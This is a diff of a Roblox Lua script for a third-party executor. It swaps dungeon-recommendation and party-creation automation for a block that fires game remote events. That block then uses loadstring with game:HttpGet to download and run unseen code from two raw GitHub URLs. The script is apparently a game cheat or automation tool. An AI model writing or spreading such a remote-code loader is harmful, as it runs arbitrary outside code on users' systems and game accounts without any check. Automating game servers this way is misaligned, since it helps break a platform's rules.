@@ -1,46 +1,8 @@
-local player = game:GetService("Players").LocalPlayer
-local head = player.Character and player.Character:FindFirstChild("Head")
+-- Configurable SolaraMode
+getgenv().SolaraMode = true  -- Set this to true or false as needed
 
--- Dungeon data with exact level requirements
-local dungeons = {
-    { name = "Desert Temple", levels = {1, 5, 15}, difficulties = {"Easy", "Medium", "Hard"} },
-    { name = "Winter Outpost", levels = {30, 40, 50}, difficulties = {"Easy", "Medium", "Hard"} },
-    { name = "Pirate Island", levels = {60, 65}, difficulties = {"Insane", "Nightmare"} },
-    { name = "King's Castle", levels = {70, 75}, difficulties = {"Insane", "Nightmare"} },
-    { name = "The Underworld", levels = {80, 85}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Samurai Palace", levels = {90, 95}, difficulties = {"Insane", "Nightmare"} },
-    { name = "The Canals", levels = {100, 105}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Ghastly Harbor", levels = {110, 115}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Steampunk Sewers", levels = {120, 125}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Orbital Outpost", levels = {135, 140}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Volcanic Chamber", levels = {150, 155}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Aquatic Temple", levels = {160, 165}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Enchanted Forest", levels = {170, 175}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Northern Lands", levels = {180, 185}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Gilded Skies", levels = {190, 195}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Yokai Peak", levels = {200, 205}, difficulties = {"Insane", "Nightmare"} },
-    { name = "Abyssal Void", levels = {210, 221}, difficulties = {"Insane", "Nightmare"} }
-}
-
--- Function to find the recommended dungeon based on current level
-local function getRecommendedDungeon(level)
-    local nextDungeon = nil  -- Track the next available dungeon based on level
-    
-    for _, dungeon in ipairs(dungeons) do
-        for i, reqLevel in ipairs(dungeon.levels) do
-            if level >= reqLevel then
-                nextDungeon = { name = dungeon.name, difficulty = dungeon.difficulties[i] }
-            elseif level < reqLevel then
-                return nextDungeon.name, nextDungeon.difficulty
-            end
-        end
-    end
-
-    return nextDungeon and nextDungeon.name, nextDungeon and nextDungeon.difficulty
-end
-
--- AutoMenu Execution
-if getgenv().AutoMenu then
+-- Check if AutoMenu is enabled
+if getgenv().AutoMenu then    
     -- Step 1: Execute various server calls
     local args = {
         [1] = {
@@ -50,20 +12,33 @@ if getgenv().AutoMenu then
             [2] = "2"
         }
     }
+    
     game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
     wait(1.5)
-
-    args = { [1] = { [1] = "ui", [2] = "LeaderboardGui" } }
+    
+    local args = {
+        [1] = {
+            [1] = "ui",
+            [2] = "LeaderboardGui"
+        }
+    }
+    
     game:GetService("ReplicatedStorage").Utility.AssetRequester.Remote:InvokeServer(unpack(args))
     
-    args = { [1] = "GetWeapons" }
+    local args = {
+        [1] = "GetWeapons"
+    }
+    
     game:GetService("ReplicatedStorage").remotes.getData:InvokeServer(unpack(args))
     game:GetService("ReplicatedStorage").remotes.reloadInvy:InvokeServer()
     
-    args = { [1] = "Desert Temple" }
+    local args = {
+        [1] = "Desert Temple"
+    }
+    
     game:GetService("ReplicatedStorage").remotes.getDungeonStats:InvokeServer(unpack(args))
     
-    args = {
+    local args = {
         [1] = {
             [1] = {
                 [1] = "\1",
@@ -75,105 +50,31 @@ if getgenv().AutoMenu then
             [2] = "L"
         }
     }
-    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+    
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))   
     
     wait(0.9)
-    print("AutoMenu execution complete.")
-else
-    print("Macro Successfully Saved and Loaded")
-end
-
--- AutoMakeDungeon Execution
-if getgenv().AutoMakeDungeon then
-    if head then
-        local playerNameplate = head:FindFirstChild("playerNameplate")
-        if playerNameplate then
-            local levelTextLabel = playerNameplate:FindFirstChild("Level")
-            if levelTextLabel then
-                local playerLevel = tonumber(levelTextLabel.Text)
-                
-                -- GUI for displaying level
-                local screenGui = Instance.new("ScreenGui")
-                screenGui.Parent = player:WaitForChild("PlayerGui")
-                
-                local levelDisplay = Instance.new("TextLabel")
-                levelDisplay.Parent = screenGui
-                levelDisplay.Text = "Current Player Level: " .. playerLevel
-                levelDisplay.Size = UDim2.new(0.4, 0, 0.1, 0)
-                levelDisplay.Position = UDim2.new(0.3, 0, 0.4, 0)
-                levelDisplay.BackgroundTransparency = 0.2
-                levelDisplay.TextSize = 18
-                levelDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
-                levelDisplay.BackgroundColor3 = Color3.fromRGB(54, 57, 63)
-                levelDisplay.Font = Enum.Font.GothamSemibold
-                
-                local uiCorner = Instance.new("UICorner")
-                uiCorner.CornerRadius = UDim.new(0, 12)
-                uiCorner.Parent = levelDisplay
-                
-                wait(2)
-                levelDisplay.Text = "Checking Recommended Dungeon..."
-                
-                -- Find recommended dungeon based on level
-                local dungeonName, difficulty = getRecommendedDungeon(playerLevel)
-                
-                if dungeonName and difficulty then
-                    wait(2)
-                    levelDisplay.Text = "Recommended Dungeon: " .. dungeonName .. " (" .. difficulty .. ")"
-                    
-                    -- Setup args to create the recommended party
-                    local createPartyArgs = {
-                        [1] = {
-                            [1] = {
-                                [1] = "\1",
-                                [2] = {
-                                    ["\3"] = "CreateParty",
-                                    ["partyData"] = {
-                                        ["difficulty"] = difficulty,
-                                        ["minimumJoinLevel"] = playerLevel,
-                                        ["tier"] = 1,
-                                        ["visibility"] = "Public",
-                                        ["mode"] = "Normal",
-                                        ["dungeonName"] = tostring(dungeonName),
-                                        ["maxPlayers"] = 40
-                                    }
-                                }
-                            },
-                            [2] = "5"
-                        }
-                    }
-                    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(createPartyArgs))
-                    
-                    wait(2)
-                    levelDisplay.Text = "Starting Dungeon..."
-                    
-                    -- Fire server event to start party
-                    local startPartyArgs = {
-                        [1] = {
-                            [1] = {
-                                [1] = "\1",
-                                [2] = { ["\3"] = "StartParty" }
-                            },
-                            [2] = "5"
-                        }
-                    }
-                    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(startPartyArgs))
-                    
-                    -- Remove GUI after a brief delay
-                    wait(2)
-                    screenGui:Destroy()
-                else
-                    levelDisplay.Text = "No suitable dungeon found for your level."
-                    wait(2)
-                    screenGui:Destroy()
-                end
-            else
-                warn("Level TextLabel not found")
-            end
+    
+    -- Step 2: Load and run the appropriate external script based on SolaraMode
+    print("Executing The Script...")
+    
+    local version = os.time()  -- Prevent caching
+    local success, err = pcall(function()
+        if getgenv().SolaraMode then
+            -- Current loadstring
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/Holder/refs/heads/main/Pop" .. version))()
         else
-            warn("playerNameplate not found")
+            -- Alternative loadstring (you can replace this URL with your own)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/wset3/test5/refs/heads/main/5"))()
         end
+    end)
+
+    -- Step 3: Check if the loadstring was successful
+    if not success then
+        print("Error loading script: ", err)
     else
-        warn("Head not found")
+        print("Script loaded successfully.")
     end
+else
+    print("Macro Succesfully Saved and Load")
 end
